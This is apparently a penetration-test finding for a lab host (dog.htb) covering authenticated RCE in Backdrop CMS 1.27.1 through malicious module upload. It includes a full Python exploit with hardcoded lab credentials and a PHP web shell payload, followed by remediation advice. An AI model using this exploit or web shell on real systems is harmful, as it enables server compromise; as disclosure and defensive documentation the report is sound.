# Backdrop CMS Authenticated Remote Code Execution via Malicious Module Upload

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-22 19:47:45 UTC
**Target:** http://dog.htb
**Endpoint:** /admin/installer/manual
**Method:** POST
**CWE:** CWE-434
**CVSS:** 7.2

## Description

Backdrop CMS version 1.27.1 is vulnerable to authenticated remote code execution through the module installer functionality. An attacker with administrator credentials can upload a malicious module archive containing a PHP web shell, which gets extracted to a publicly accessible location within the web root, enabling arbitrary command execution on the server.

## Impact

Successful exploitation provides the attacker with remote code execution capabilities on the target server, running as the web server user (www-data). This enables:
- Full control over web application files
- Database access with web application credentials
- Lateral movement opportunities within the server environment
- Potential privilege escalation to compromise the entire system

The vulnerability requires valid administrator credentials, which can be obtained through other attack vectors such as credential exposure from the .git repository.

## Technical Analysis

The vulnerability exists in the module installation mechanism at /admin/installer/manual. The attack flow:

1. Authenticate to Backdrop CMS with administrator privileges
2. Enable maintenance mode via /admin/config/development/maintenance
3. Craft a malicious tar.gz archive containing:
   - {random_name}/{random_name}.info - Module manifest (name, type=module, backdrop=1.x)
   - {random_name}/shell.php - PHP web shell (<?php system($_GET['cmd']); ?>)
4. Upload via AJAX POST to /?q=system/ajax targeting installer_manager_install_form
5. The installer extracts the archive to /modules/{random_name}/
6. Access web shell at http://dog.htb/modules/{random_name}/shell.php?cmd=id

The module installer does not adequately validate module contents, allowing arbitrary PHP files to be placed in the web root. The AJAX-based upload bypasses standard form validation.

## Proof of Concept

1. Authenticate to Backdrop CMS at http://dog.htb/?q=user/login
2. Enable maintenance mode
3. Create malicious module archive with shell.php
4. Upload via installer AJAX endpoint
5. Trigger batch authorization to complete installation
6. Access shell at http://dog.htb/modules/{name}/shell.php?cmd=id
7. Verify command execution as www-data (uid=33)

```
import requests
import random
import string
import tarfile
import io
import re
import json

TARGET = "http://dog.htb"
USERNAME = "tiffany"
PASSWORD = "BackDropJ2024DS2024"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()

# Login
login_page = session.get(f"{TARGET}/?q=user/login")
form_build_id = re.search(r'name="form_build_id" value="([^"]+)"', login_page.text).group(1)
form_token = re.search(r'name="form_token" value="([^"]+)"', login_page.text).group(1)

login_data = {
    "name": USERNAME,
    "pass": PASSWORD,
    "form_build_id": form_build_id,
    "form_token": form_token,
    "form_id": "user_login",
    "op": "Log in"
}
session.post(f"{TARGET}/?q=user/login", data=login_data)

# Enable maintenance mode
mm_page = session.get(f"{TARGET}/?q=admin/config/development/maintenance")
mm_form_build_id = re.search(r'name="form_build_id" value="([^"]+)"', mm_page.text).group(1)
mm_data = {
    "maintenance_mode": 1,
    "form_build_id": mm_form_build_id,
    "form_id": "system_site_maintenance_mode",
    "op": "Save configuration"
}
session.post(f"{TARGET}/?q=admin/config/development/maintenance", data=mm_data)

# Create malicious module
mod_name = f"rvz{random_string(6)}"
info_content = f"name = {mod_name}\ntype = module\nbackdrop = 1.x"
shell_content = '<?php system($_GET["cmd"]); ?>'

tar_buffer = io.BytesIO()
with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
    info_file = io.BytesIO(info_content.encode())
    tar.addfile(tarfile.TarInfo(f"{mod_name}/{mod_name}.info"), info_file)
    shell_file = io.BytesIO(shell_content.encode())
    tar.addfile(tarfile.TarInfo(f"{mod_name}/shell.php"), shell_file)
tar_buffer.seek(0)

# Get installer form
installer_page = session.get(f"{TARGET}/?q=admin/installer/manual")
installer_form_build_id = re.search(r'name="form_build_id" value="([^"]+)"', installer_page.text).group(1)
installer_form_token = re.search(r'name="form_token" value="([^"]+)"', installer_page.text).group(1)

# Upload via AJAX
from requests_toolbelt.multipart.encoder import MultipartEncoder

files = {
    "bulk": ("", ""),
    "project_url": ("", ""),
    "files[project_upload]": (f"{mod_name}.tar.gz", tar_buffer, "application/gzip"),
    "form_build_id": ("", installer_form_build_id),
    "form_token": ("", installer_form_token),
    "form_id": ("", "installer_manager_install_form"),
    "_triggering_element_name": ("", "op"),
    "_triggering_element_value": ("", "Install"),
}

multipart = MultipartEncoder(fields=files)
headers = {
    "Content-Type": multipart.content_type,
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/vnd.backdrop.ajax, */*;q=0.01"
}

response = session.post(f"{TARGET}/?q=system/ajax", data=multipart, headers=headers)
batch_id = re.search(r'"batchId":"(\d+)"', response.text).group(1)

# Trigger batch
session.get(f"{TARGET}/core/authorize.php?batch=1&id={batch_id}&op=do_nojs")
session.get(f"{TARGET}/core/authorize.php?batch=1&id={batch_id}&op=do")

# Test shell
shell_url = f"{TARGET}/modules/{mod_name}/shell.php?cmd=id"
result = session.get(shell_url)
print(f"Shell URL: {shell_url}")
print(f"Command output: {result.text}")
```

## Remediation

1. Update Backdrop CMS to the latest version if a patch is available

2. Restrict module installation to only verified sources:
   - Disable the manual module upload functionality
   - Use only the official Backdrop CMS module repository

3. Implement strict file type validation on uploads:
   - Reject any archives containing executable PHP files
   - Scan uploaded modules for malicious content

4. Restrict write permissions on the modules directory:
   - Prevent web server from writing to /modules/
   - Use a separate, non-web-accessible staging area for module uploads

5. Implement Web Application Firewall (WAF) rules to detect and block common web shell patterns

6. Monitor for suspicious files in web-accessible directories

7. Limit administrator access through multi-factor authentication
